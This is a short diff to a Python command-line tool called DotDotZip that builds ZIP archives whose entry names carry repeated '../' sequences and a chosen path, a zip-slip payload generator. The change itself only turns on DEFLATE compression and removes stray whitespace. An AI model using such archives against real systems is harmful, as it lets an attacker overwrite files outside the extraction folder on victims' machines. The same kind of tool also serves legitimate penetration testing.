@@ -1,7 +1,7 @@
 import tomllib
 import base64
 
-from zipfile import ZipFile
+from zipfile import ZipFile, ZIP_DEFLATED
 from argparse import ArgumentParser
 from io import BytesIO
 from importlib import metadata
@@ -23,7 +23,7 @@ def version_redundant():
         return version_from_pyproject_toml()
 
 def create_payload(zip_target, traverse_count, prepend_path, pack_files):
-    with ZipFile(zip_target, mode='w') as zf:
+    with ZipFile(zip_target, mode='w', compression=ZIP_DEFLATED, compresslevel=9) as zf:
         traverse_str = '../' * traverse_count
         for file_name in pack_files:
             try:
@@ -33,14 +33,14 @@ def create_payload(zip_target, traverse_count, prepend_path, pack_files):
 
 def main():
     parser = ArgumentParser(description=f"DotDotZip v. {version_redundant()}")
-    
+
     parser.add_argument("--traverse-count", type=int, default=5, help="Number of '../' sequences to prepend")
     parser.add_argument("--zip-name", type=str, help="Name of the output ZIP archive (leave blank to output Base64 encoded ZIP to the console)")
     parser.add_argument("--prepend-path", type=str, required=True, help="Extra path to prepend")
     parser.add_argument("--pack-files", type=str, nargs='+', required=True, help="Names of files to pack")
-    
+
     args = parser.parse_args()
-    
+
     if args.zip_name:
         create_payload(args.zip_name, args.traverse_count, args.prepend_path, args.pack_files)
     else:
